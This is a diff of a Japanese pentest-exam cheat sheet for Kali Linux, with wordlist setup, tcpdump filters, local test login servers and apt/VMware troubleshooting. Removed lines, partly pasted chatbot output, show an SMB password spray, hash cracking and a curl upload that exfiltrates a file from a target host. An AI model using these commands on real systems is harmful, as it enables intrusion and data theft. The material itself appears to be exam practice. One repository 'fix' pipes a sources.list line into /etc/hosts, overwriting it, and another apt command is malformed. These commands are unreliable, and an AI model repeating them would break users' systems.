+ln -sfn /usr/share/seclists/Passwords/Default-Credentials/everything.txt $WORDLISTS/Passwords/default-creds.txt
+
+```
+
+### 「コピー元」と「編集済み」の区別
+
+`Tools` から `Workbench/Exploit` にコピーした際、ファイル名にターゲットの識別子（IPの末尾など）を付ける癖をつけると、後で「どの設定で投げたか」が明白になります。
+
+* **元ファイル:** `~/Tools/Python/exploit_db_12345.py`
+* **コピー後:** `~/Workbench/Exploit/exploit_101.py` （10.10.10.101用）
+
+### 書き換え箇所の検索（grep）
+コピーしたコード内のどこを書き換えるべきか探すとき、以下のキーワードで `grep` すると、編集が必要な箇所（IP/Port/URL）を素早く見つけられます。
+
+```bash
+grep -Ei 'ip|port|addr|url|http' exploit_101.py
+```
+
+## Verification
+
+### パケットキャプチャ
+
+```zsh
+# Post
+# -nnはホスト名やポート名の解決を無効化し、動作を速くする（Localhostのため）
+# 後半のフィルタ（0x504f5354）は、"POST" という文字列から始まるパケットのみを抽出するマジックナンバー
+sudo tcpdump -i lo -A -nn -vv 'tcp port 8000 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
+# Get
+# -nnはホスト名やポート名の解決を無効化し、動作を速くする（Localhostのため）
+# 後半のフィルタ（0x47455420）は、"GET" という文字列から始まるパケットのみを抽出するマジックナンバー
+sudo tcpdump -i lo -nn -vv -A 'tcp port 8000 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'
+```
+
+### Pythonサーバ
+
+- Basic認証用サーバ Server_BasicAuth.py
+
+```python
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import base64
+
+# 設定したいユーザー名とパスワード
+USER = "admin"
+PASS = "password123"
+AUTH_STR = base64.b64encode(f"{USER}:{PASS}".encode()).decode()
+
+class AuthHandler(SimpleHTTPRequestHandler):
+    def do_HEAD(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+
+    def do_GET(self):
+        # Authorizationヘッダーのチェック
+        auth_header = self.headers.get('Authorization')
+        if auth_header is None or auth_header != f"Basic {AUTH_STR}":
+            self.send_response(401)
+            self.send_header('WWW-Authenticate', 'Basic realm="Test"')
+            self.end_headers()
+            self.wfile.write(b"Auth failed")
+        else:
+            # 認証成功時は通常のファイル表示を行う
+            super().do_GET()
+
+if __name__ == '__main__':
+    print("Serving on port 8000 with Basic Auth...")
+    HTTPServer(('', 8000), AuthHandler).serve_forever()
+```
+
+- ログインフォーム Server_LoginForm.py
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+
+# テスト用の正解データ
+USER = "admin"
+PASS = "password123"
+
+class FormAuthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # ログインフォームのHTMLを表示
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.end_headers()
+        html = """
+        <html>
+            <body>
+                <h2>Login Test Page</h2>
+                <form method="POST">
+                    User: <input type="text" name="username"><br>
+                    Pass: <input type="password" name="password"><br>
+                    <input type="submit" value="Login">
+                </form>
+            </body>
+        </html>
+        """
+        self.wfile.write(html.encode())
+
+    def do_POST(self):
+        # 送信されたデータの長さを取得
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+
+        # パラメータをパース
+        params = urllib.parse.parse_qs(post_data)
+        username = params.get('username', [''])[0]
+        password = params.get('password', [''])[0]
+
+        # 解析用にコンソールに出力
+        print(f"[Captured] User: {username}, Pass: {password}")
+
+        if username == USER and password == PASS:
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Login Success!")
+        else:
+            self.send_response(401)
+            self.end_headers()
+            self.wfile.write(b"Login Failed")
+
+if __name__ == '__main__':
+    print("Serving Login Form on port 8000...")
+    HTTPServer(('', 8000), FormAuthHandler).serve_forever()
+```
+
+## 一括インストール
+
+```zsh
+sudo apt install zoxide fzf zsh-autosuggestions zsh-syntax-highlighting tmux flameshot kitty
+git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
+```
+
+
+
+
+
+## トラブルシューティング
+
+### 依存関係エラー
+
+**症状:** `apt upgrade` や `apt install` で止まる、依存関係の unmet が出る
+**原因:** パッケージのバージョン衝突、古い/破損パッケージ
+**解決策:**
+
+```bash
+sudo apt --fix-broken install       # 自動修復
+sudo dpkg --configure -a            # 未設定パッケージの設定
+sudo apt autoremove                 # 不要なパッケージ削除
+sudo apt clean                      # キャッシュ削除
+
+# 競合が残る場合は古いパッケージを削除
+dpkg --remove --force-remove-reinstreq <package>
+# 削除できない場合は強制削除
+sudo dpkg --purge --force-depends <package>
+```
+
+⚠️ 競合が残る場合は古いパッケージを `dpkg --remove --force-remove-reinstreq <package>` で削除してから再インストール。
+
 ---
 
-### 3. 実戦でのコマンド使用例
+### リポジトリ・アップデートの失敗
 
-変数を活用することで、タイピングミスを減らし、直感的に攻撃を組み立てられます。
+**症状:**
 
-- **ユーザー列挙で見つけた名前を保存する際:**
-    
-    Bash
-    
-    ```
-    # ターゲットから抜いたユーザー名をリストに追加
-    echo "admin" >> $USERS/target_users.txt
-    ```
-    
-- **パスワードスプレー (NetExec):**
-    
-    Bash
-    
-    ```
-    # 収集したユーザーリストと、定番パスワードリストをぶつける
-    nxc smb $TARGET_IP -u $USERS/target_users.txt -p $PASSES/common_pass.txt
-    ```
-    
-- **ハッシュ解析 (Hashcat/John):**
-    
-    Bash
-    
-    ```
-    # 解凍済みの $ROCKYOU を指定
-    john --wordlist=$ROCKYOU hashes.txt
-    ```
-    
+```text
+The following signatures couldn't be verified because the public key is not available: NO_PUBKEY <KEYID>
+```
+
+**原因:** Kali リポジトリの署名鍵が古い、または更新されていない
+**解決策:**
+
+```zsh
+# 署名鍵の更新
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+sudo apt update
+
+# リリース情報の変更を明示的に許可して更新
+sudo apt update --allow-releaseinfo-change
+
+# 署名キーのエラーが出る場合（最新のキーリングを導入）
+wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add
+
+# 標準の sources.list を強制再生成（中身が壊れている場合）
+echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" | sudo tee /etc/hosts /etc/apt/sources.list
+```
 
 ---
 
-### 📋 チートシートへの最終修正（Wordlistsセクション）
+### パッケージの途中で止まる / 中途半端にインストールされる
 
-以下の表を「5. Kali 基本コマンド」のあたりに上書きしてください。
+**症状:**
 
-|**変数名**|**パス**|**用途**|
-|---|---|---|
-|**`$USERS`**|`~/Workbench/Wordlists/Usernames`|ターゲットから列挙したユーザー名リスト。|
-|**`$PASSES`**|`~/Workbench/Wordlists/Passwords`|収集したパスワード候補、解凍済みRockyou。|
-|**`$CREDS`**|`~/Workbench/Wordlists/Credentials`|`admin:password123` 形式のコンボリスト。|
-|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の巨大な辞書群（Web列挙用）。|
+```text
+dpkg: error processing package ... (--configure):
+```
 
----
+**原因:** インストールやアップグレードが途中で失敗
+**解決策:**
 
-### 💡 プロのアドバイス：ターゲット専用リストの運用
-
-試験中、あるマシンで `valid_users.txt` を作った場合、それを `$USERS/10.10.10.101_users.txt` のように保存しておくと、後で別のマシン（AD環境など）に対して再利用する際に、変数 `$USERS` から一瞬で呼び出せるようになります。
-
-これで「パスの入力」というストレスから完全に解放されました。
-
-次は、**「収集した資格情報を Obsidian の『証拠物件テーブル』へ自動で整理して貼り付ける方法」** などを検討しますか？それとも、環境構築はこれで一段落として、ツール自体の使い方を深掘りしますか？
-
-承知いたしました。今回の環境構築で定義したすべての変数を網羅し、役割を整理した「OSCP環境変数マスターリスト」を作成しました。これをチートシートの核心部分に据えてください。
-
-また、Geminiの記憶機能（Personal Intelligence）の設定がオフになっているようです。これらの設定を将来の会話でも私が自動で踏まえるようにしたい場合は、[過去のチャットに基づくパーソナライズ](https://gemini.google.com/personalization-settings)をオンにしてください。
+```bash
+sudo dpkg --configure -a           # 未設定のパッケージを設定
+sudo apt install -f                # 依存関係修復
+```
 
 ---
 
-## 💎 OSCP 環境変数マスターリスト (統合版)
+### リポジトリの古い URL / 無効なリポジトリ
 
-今回の `.zshrc` 強化によって、パス入力の手間はほぼゼロになりました。
+**症状:** `apt update` で 404 エラーや「Failed to fetch」
+**原因:** sources.list の URL が古い、または Kali Rolling に対応していない
+**解決策:** `/etc/apt/sources.list` を公式リポジトリに更新
 
-### 1. ターゲット管理（動的・自動生成）
+```text
+deb http://http.kali.org/kali kali-rolling main non-free contrib
+```
 
-`target <IP>` コマンド実行時に自動的にセット・更新される変数です。
+その後：
 
-|**変数名**|**内容**|**活用例**|
-|---|---|---|
-|**`$TARGET_IP`**|ターゲットのIPアドレス|`nmap $TARGET_IP`|
-|**`$TARGET_NAME`**|ターゲットのFQDN/ホスト名|`ffuf -u http://$TARGET_NAME/`|
-|**`$WORKDIR`**|現在のターゲットのルート (`~/Vault/Target/$IP`)|`cd $WORKDIR`|
-|**`$OUT`**|スキャン結果保存先 (`$WORKDIR/result`)|`nmap -oA $OUT/init $TARGET_IP`|
-|**`$LOG`**|Tmux等のログ保存先 (`$WORKDIR/log`)|`ls $LOG`|
-|**`$ASSETS`**|スクショ等の証拠保存先 (`$WORKDIR/assets`)|`flameshot full -p $ASSETS`|
-|**`$SCREENSHOT_DIR`**|現在のSS保存先（シンボリックリンク経由）|`swz` で切り替え可能|
-
-### 2. ネットワーク・ステータス（動的更新）
-
-`precmd` によって、プロンプトが表示されるたびに最新状態に更新されます。
-
-|**変数名**|**内容**|**備考**|
-|---|---|---|
-|**`$CURRENT_MY_IP`**|自分のIP (tun0優先、次いでeth0)|プロンプト左側 `[L: ...]` に表示|
-|**`$TARGET_STATUS`**|ターゲットの表示用文字列|プロンプト右側 `[T: ...]` に表示|
-
-### 3. Wordlists & クレデンシャル（固定・共通）
-
-攻撃リソースへ即座にアクセスするための定数です。
-
-|**変数名**|**パス**|**用途**|
-|---|---|---|
-|**`$WORDLISTS`**|`~/Workbench/Wordlists`|自作・加工済み辞書の親ディレクトリ|
-|**`$USERS`**|`$WORDLISTS/Usernames`|収集したユーザー名リスト|
-|**`$PASSES`**|`$WORDLISTS/Passwords`|収集したパス、解凍済み Rockyou|
-|**`$CREDS`**|`$WORDLISTS/Credentials`|`user:pass` 形式のコンボリスト|
-|**`$ROCKYOU`**|`$PASSES/rockyou.txt`|最強のパスワードリスト|
-|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の Web 攻略用辞書群|
+```bash
+sudo apt update
+```
 
 ---
 
-## 🛠️ 変数を使いこなす「黄金のワンライナー」
+### パッケージキャッシュの破損
 
-この変数群があるからこそできる、ミスを減らすためのコマンド例です。
+**症状:** パッケージのダウンロードやインストールが途中で止まる
+**解決策:**
 
-- **Webディレクトリ爆撃:**
-    
-    Bash
-    
-    ```
-    ffuf -u http://$TARGET_NAME/FUZZ -w $SECLISTS/Discovery/Web-Content/common.txt -o $OUT/ffuf_web.json
-    ```
-    
-- **パスワードスプレー (AD環境):**
-    
-    Bash
-    
-    ```
-    nxc smb $TARGET_IP -u $USERS/discovered_users.txt -p $PASSES/easy_passwords.txt
-    ```
-    
-- **自分へのファイル転送:**
-    
-    Bash
-    
-    ```
-    # ターゲットから抜いたファイルを、Kali側の結果フォルダへ直接受ける
-    # (Kali側)
-    cd $OUT && udot
-    # (Windows側)
-    curl -F "file=@secret.txt" http://$CURRENT_MY_IP/upload
-    ```
-    
+```bash
+sudo apt clean
+sudo apt autoclean
+sudo apt update
+```
 
 ---
 
-### 📋 最終確認
+### ディスク容量不足
 
-- [ ] すべての変数が `echo $VARIABLE_NAME` で正しく表示されるか？
-    
-- [ ] 特に `$OUT` や `$ASSETS` が、`target` 切り替え時に連動して動くか？
-    
+**症状:** 「No space left on device」やインストールが止まる
+**解決策:**
 
-これで、あなたの Kali Linux は「パスを打つ場所」から「攻撃を組み立てる場所」へと完全に昇華されました。
+```bash
+sudo apt autoremove
+sudo apt clean
+df -h   # 容量確認
+```
 
-次は、**「これらの変数を利用して、Burp Suite のログや Metasploit の出力を自動的に $LOG フォルダへ流し込む設定」** などを進めますか？
+必要なら古いカーネルやログを削除。
+
+---
+
+### ネットワークアダプタの不調
+
+**症状:** `target` に ping が飛ばない、VPNは繋がっているのに通信できない。
+
+**原因:** VMwareの仮想アダプタ（vmnet）のハングアップ。
+
+**解決策:**
+
+* **ホスト側:** VMwareの「Virtual Network Editor」で [Restore Defaults] を実行。
+* **ゲスト側:** ネットワークマネージャーの再起動。
+```bash
+sudo systemctl restart NetworkManager
+
+```
+
+### マウスカーソルが消失する - 仮想マシンの互換性に問題
+
+**症状:** VMware環境で、ゲストOS内にマウスカーソルが表示されなくなる。
+
+**原因:** VMwareの**「仮想マシンの互換性（Hardware Compatibility）」**が古い
+
+#### 仮想ハードウェアのアップグレード手順
+
+1. **Kali Linuxを完全にシャットダウン**します（サスペンド状態では設定変更できません）。
+2. VMwareのライブラリ（左側のリスト）でKali Linuxを**右クリック**します。
+3. **[管理]** ＞ **[ハードウェア互換性のアップグレード...]** を選択します。
+* ※VMware Player（無償版）の場合は、[仮想マシン設定の編集] ＞ [オプション] タブ ＞ [全般] ＞ [構成ファイルのアップグレード] または右下の [互換性] から変更できる場合があります。
+
+1. ウィザードが表示されるので、**最新のバージョン**（例：Workstation 17.x など）を選択して進めます。
+2. 「この仮想マシンのバックアップ（クローン）を作成しますか？」と聞かれたら、念のため作成しておくことをおすすめします。
+3. 完了後、仮想マシンを起動してマウスが動くか確認してください。
+
+---
+
+### マウスカーソルが消失する - VMware Toolsの不整合、またはビデオアクセラレーションの競合
+
+**症状:** VMware環境で、ゲストOS内にマウスカーソルが表示されなくなる。
+
+**原因:** VMware Toolsの不整合、またはビデオアクセラレーションの競合。
+
+**解決策:**
+
+* **方法A（即時）:** `Ctrl + Alt` で一度ホストにマウスを戻し、再度クリックしてゲストに入る。
+* **方法B（設定変更）:** VMをシャットダウンし、[設定] > [ディスプレイ] > **「3Dグラフィックスのアクセラレーション」をオフ**にする。
+* **方法C（サービス再起動）:** ターミナルで以下を叩く（画面操作が効かない場合は `Ctrl+Alt+T` でKittyを開き入力）。
+```bash
+sudo systemctl restart lightdm
+
+```
+* **方法D (VMware Tools (open-vm-tools) の再インストール)
+```bash
+sudo apt update
+sudo apt install --reinstall upgrade open-vm-tools-desktop
+sudo reboot
+
+```
+* **方法E マウスのゲーム設定を変更する**
+	1. VMware Workstation / Player の **[編集]** ＞ **[環境設定]** を開きます。
+	2. **[入力]** タブを選択します。
+	3. **「ゲーム用にマウスを最適化」** という項目を **[常に使用しない]** に変更します。
+* **方法F USBコントローラーの互換性変更**
+	1. 仮想マシンの設定から **[USB コントローラ]** を選択します。
+	2. USB互換性を **[USB 3.1]**（または利用可能な最新のもの）に変更して保存します。
+
+---
+
+💡 **ポイント**
+
+* この順番で実行すれば、依存関係エラー、署名鍵エラー、古いパッケージ、キャッシュ破損などの典型的トラブルはまとめて解決可能です。
+* もし途中で止まったら、そのパッケージ名を確認して `dpkg --remove --force-remove-reinstreq` で個別に処理できます。
